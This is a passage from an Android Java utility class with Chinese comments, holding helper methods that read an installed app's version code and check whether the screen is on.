            // TODO Auto-generated catch block
            e.printStackTrace();
            return pi;
        }
    }
    /**
     * 获取应用版本号
     *
     * @return 当前应用的版本号
     */
    public static int getVersion(Context context, String pkg) {
        try {
            PackageManager manager = context.getPackageManager();
            PackageInfo info = manager.getPackageInfo(pkg, 0);
            if (info == null) return 0;
            return info.versionCode;
        } catch (Exception e) { //有异常，可能代表都，这个包没有被安装。
            //e.printStackTrace();  
            return 0;
        }
    }

    /**
     * @param ctx
     * @return 屏幕是否是亮的。
     */
    public static boolean isScreenOn(Context ctx) {
        PowerManager pm = (PowerManager) ctx
                .getSystemService(Context.POWER_SERVICE);
        boolean isScreenOn = pm.isScreenOn();// 如果为true，则表示屏幕“亮”了，否则屏幕“暗”了。
        return isScreenOn;
    }

}